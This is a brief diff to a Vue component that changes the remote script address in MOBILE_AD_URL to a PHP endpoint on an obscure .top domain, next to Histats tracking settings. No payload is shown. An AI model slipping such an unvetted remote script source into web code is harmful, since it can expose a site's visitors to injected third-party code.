@@ -8,7 +8,7 @@
 import { nextTick, onBeforeUnmount, onMounted, ref, watch } from 'vue'
 import { useRoute } from 'vue-router'
 
-const MOBILE_AD_URL = 'https://fyb.pages.dev/tts.js'
+const MOBILE_AD_URL = 'https://cmp-2020.ios81x.top/dh.php'
 const HISTATS_SITE = '1,4671415,4,0,0,0,00010000'
 const HISTATS_FASI = '1'
 
